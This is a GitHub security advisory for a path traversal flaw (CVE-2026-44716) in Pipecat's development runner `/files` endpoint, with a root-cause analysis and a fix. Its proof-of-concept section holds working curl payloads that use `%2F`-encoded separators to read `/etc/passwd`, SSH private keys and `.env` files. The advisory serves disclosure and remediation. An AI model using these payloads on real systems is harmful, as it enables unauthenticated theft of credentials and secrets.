# [H] Pipecat: Path Traversal in Pipecat Runner `/files` Endpoint — Arbitrary File Read via `%2F`-Encoded Separator

## Summary
Severity: High
Advisory: GHSA-3363-2ph6-35wh
CVE: CVE-2026-44716
CWE: CWE-22
Ecosystem: PyPI
CVSS: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:N/A:N (CVSS_V3)
Published: 2026-05-15
Source: https://github.com/advisories/GHSA-3363-2ph6-35wh
Type: github-advisory

## Affected
- PyPI: `pipecat-ai` — affected >=0.0.90 <1.2.0

## Details
## Summary

A path traversal vulnerability exists in Pipecat's development runner (`src/pipecat/runner/run.py`). When the runner is started with the `--folder` flag, it exposes a `GET /files/{filename:path}` download endpoint. The `filename` path parameter is concatenated directly onto `args.folder` with no containment check. Starlette normalises literal `../` sequences in URLs, but `%2F`-encoded slashes bypass this normalisation: the path parameter is URL-decoded *after* routing, so `..%2F..%2Fetc%2Fpasswd` resolves to a path two levels above `args.folder`. An attacker with network access to the runner can read any file the pipecat process has permission to access — including SSH private keys, credentials, and system files — with a single unauthenticated HTTP request.

Confirmed on **pipecat-ai 1.1.0** (latest PyPI release) and commit `f078df78058ae82a02ce5b23e9e3a99a0917a53d`.

---

## Details

The vulnerable code is in `src/pipecat/runner/run.py`, inside the `_configure_server_app()` function, lines 249–264:

```python
@app.get("/files/{filename:path}")
async def download_file(filename: str):
    """Handle file downloads."""
    if not args.folder:
        logger.warning(f"Attempting to dowload {filename}, but downloads folder not setup.")
        return

    file_path = Path(args.folder) / filename          # ← no containment check
    if not os.path.exists(file_path):
        raise HTTPException(404)

    media_type, _ = mimetypes.guess_type(file_path)

    return FileResponse(path=file_path, media_type=media_type, filename=filename)
```

`Path(args.folder) / filename` joins the caller-supplied `filename` onto the base directory without calling `.resolve()` or checking `is_relative_to`. Python's `pathlib` does not strip `..` segments during join — only `.resolve()` does. Starlette strips literal `../` from the *URL path* before the route handler runs, but it decodes percent-encoded characters *inside* the matched path parameter value. Because `%2F` decodes to `/` after the router has already matched the route, the value that reaches `filename` can contain `/` characters, enabling directory traversal.

For example:

```
GET /files/..%2F..%2Fetc%2Fpasswd
                   ↓
filename = "../../etc/passwd"          (after Starlette decodes %2F)
file_path = Path("/tmp/media") / "../../etc/passwd"
          = Path("/tmp/media/../../etc/passwd")
          → resolves to /etc/passwd    (os.path.exists returns True)
```

The endpoint has no authentication — the runner does not implement any auth layer — so the request requires no credentials.

---

## Proof of Concept

### Step 1 — Start the Pipecat runner with `--folder`

The runner requires a bot script with a `bot()` entry point. A minimal script that keeps the HTTP server alive without any transport logic:

```python
# minimal_bot.py
async def bot(runner_args):
    import asyncio
    await asyncio.sleep(86400)

if __name__ == "__main__":
    from pipecat.runner.run import main
    main()
```

Start the runner:

```bash
pip install "pipecat-ai[runner,webrtc]"

mkdir /tmp/bot_media
echo "session transcript" > /tmp/bot_media/recording.txt

python minimal_bot.py \
    -t webrtc \
    --host 127.0.0.1 \
    --port 7860 \
    --folder /tmp/bot_media
```

Expected output:
<img width="1626" height="462" alt="image" src="https://github.com/user-attachments/assets/912e8ea2-cff9-4a36-a6be-e85091d9f89f" />

### Step 2 — Exploit

```bash
# Legitimate request — serves a file inside --folder
curl "http://127.0.0.1:7860/files/recording.txt"
# → session transcript

# Literal ../ — blocked by Starlette path normalisation
curl "http://127.0.0.1:7860/files/../../etc/passwd"
# → {"detail":"Not Found"}

# %2F-encoded separators — bypass normalisation, read /etc/passwd
curl "http://127.0.0.1:7860/files/..%2F..%2Fetc%2Fpasswd"
# → ## User Database
#   root:*:0:0:System Administrator:/var/root:/bin/sh
#   ...

# Read SSH private key
curl "http://127.0.0.1:7860/files/..%2F..%2F..%2Fhome%2Fuser%2F.ssh%2Fid_rsa"
# → -----BEGIN OPENSSH PRIVATE KEY-----
#   b3BlbnNzaC1rZXktdjEAAAA...

# Read application secrets
curl "http://127.0.0.1:7860/files/..%2F..%2F.env"
```

### Confirmed results (pipecat-ai 1.1.0, tested 2026-04-29)

| Request | HTTP status | Content |
|---------|-------------|---------|
| `GET /files/recording.txt` | 200 | Legitimate file |
| `GET /files/../../etc/passwd` | 404 | Blocked — literal `..` normalised away |
| `GET /files/..%2F..%2Fetc%2Fpasswd` | **200** | Full `/etc/passwd` |
| `GET /files/..%2F..%2F..%2Fhome/…/.ssh/id_rsa` | **200** | RSA private key (`BEGIN OPENSSH PRIVATE KEY`) |
<img width="2222" height="516" alt="image" src="https://github.com/user-attachments/assets/4c7a014c-8646-479a-8439-b8e722a69e49" />
<img width="1304" height="314" alt="image" src="https://github.com/user-attachments/assets/14f71b3f-2a35-4d2b-8049-8af758fbc6ba" />
<img width="1188" height="390" alt="image" src="https://github.com/user-attachments/assets/53fe2b33-2cd3-4745-b9f2-7aa426318e00" />

---

## Impact

The `--folder` flag is a documented, first-class feature of the runner: the `runner_downloads_folder()` helper and `-f / --folder` CLI argument are part of the public API. The runner documentation includes LAN-deployment examples (`--host 192.168.1.100` for ESP32 integration). In those deployments, any host on the local network can exploit this with zero credentials.

An attacker who can reach the runner port and knows `--folder` is active can retrieve any file readable by the pipecat process:

- SSH private keys and TLS certificates
- `.env` files and application credentials
- Database files, session tokens, API keys
- System files such as `/etc/passwd` and `/etc/shadow` (on Linux)
- Source code, config files, and secrets in parent directories of `--folder`

---

## Remediation

Call `.resolve()` on both the base path and the joined path, then assert containment with `is_relative_to`:

```python
@app.get("/files/{filename:path}")
async def download_file(filename: str):
    if not args.folder:
        logger.warning(f"Attempting to dowload {filename}, but downloads folder not setup.")
        return

    allowed_base = Path(args.folder).resolve()
    file_path = (allowed_base / filename).resolve()   # resolve AFTER join

    if not file_path.is_relative_to(allowed_base):    # containment check
        raise HTTPException(status_code=403, detail="Access denied")
    if not file_path.exists():
        raise HTTPException(status_code=404)

    media_type, _ = mimetypes.guess_type(file_path)
    return FileResponse(path=file_path, media_type=media_type, filename=file_path.name)
```

`Path.resolve()` expands all `..` components and follows symlinks before `is_relative_to` compares the paths, so neither `%2F`-encoded separators nor symlink chains can escape the allowed base.

## References
- https://github.com/pipecat-ai/pipecat/security/advisories/GHSA-3363-2ph6-35wh
- https://nvd.nist.gov/vuln/detail/CVE-2026-44716
- https://github.com/pipecat-ai/pipecat/pull/4417
- https://github.com/pipecat-ai/pipecat/commit/7519c26ac5508573c35fa3a9c4717b013993d129
- https://github.com/pipecat-ai/pipecat
- https://github.com/pipecat-ai/pipecat/releases/tag/v1.2.0
